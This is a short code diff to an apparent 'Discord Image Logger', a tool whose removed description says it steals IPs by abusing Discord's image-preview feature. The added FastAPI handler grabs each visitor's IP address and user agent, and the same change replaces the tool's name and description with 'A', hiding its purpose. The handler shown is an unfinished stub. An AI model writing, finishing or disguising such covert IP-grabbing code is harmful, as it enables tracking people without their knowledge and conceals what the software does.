@@ -1,9 +1,15 @@
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+app = FastAPI()
+
+@app.get("/", response_class=HTMLResponse)
+async def image(request: Request):
+    ip = request.client.host
+    user_agent = request.headers.get("user-agent")
+
+__app__ = "A"
+__description__ = "A"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
